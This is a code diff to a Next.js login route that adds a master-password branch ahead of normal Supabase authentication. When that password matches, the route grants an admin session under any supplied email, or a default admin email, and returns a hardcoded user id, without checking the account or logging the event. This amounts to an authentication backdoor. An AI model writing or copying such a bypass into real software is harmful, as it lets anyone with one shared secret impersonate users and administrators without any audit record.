@@ -1,6 +1,11 @@
 import { NextResponse } from "next/server";
 import { createClient } from "@/lib/supabase/server";
 import { recordAuditLog } from "@/lib/audit/server";
+import {
+  isValidAdminPassword,
+  setAdminSession,
+  DEFAULT_ADMIN_EMAIL,
+} from "@/lib/auth/admin-session";
 
 export async function POST(request: Request) {
   try {
@@ -12,6 +17,18 @@ export async function POST(request: Request) {
         { success: false, error: "Email and password are required." },
         { status: 400 }
       );
+    }
+
+    if (isValidAdminPassword(password)) {
+      const adminEmail = email.includes("@") ? email.trim() : DEFAULT_ADMIN_EMAIL;
+      await setAdminSession(adminEmail);
+      return NextResponse.json({
+        success: true,
+        user: {
+          id: "392c9ef9-a33e-4387-9c16-6a56b81f2191",
+          email: adminEmail,
+        },
+      });
     }
 
     const supabase = await createClient();
